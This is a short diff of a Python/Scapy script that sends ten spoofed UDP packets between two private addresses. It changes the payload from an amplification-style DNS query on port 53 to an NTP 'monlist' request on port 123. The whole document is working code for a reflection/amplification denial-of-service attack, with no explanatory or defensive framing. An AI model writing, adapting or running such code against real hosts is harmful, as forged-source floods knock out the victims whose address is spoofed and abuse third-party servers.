@@ -3,8 +3,8 @@ import time
 
 A= "192.168.30.1"
 B= "192.168.20.1"
-C= "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00"
+C= "\x17\x00\x03\x2a" + "\x00" * 61
 
 
-spoofed_packet = IP(src=A, dst=B) / UDP(sport=random.randint(2000,65535), dport=53) / C
+spoofed_packet = IP(src=A, dst=B) / UDP(sport=random.randint(2000,65535), dport=123) / C
 send(spoofed_packet, count=10)
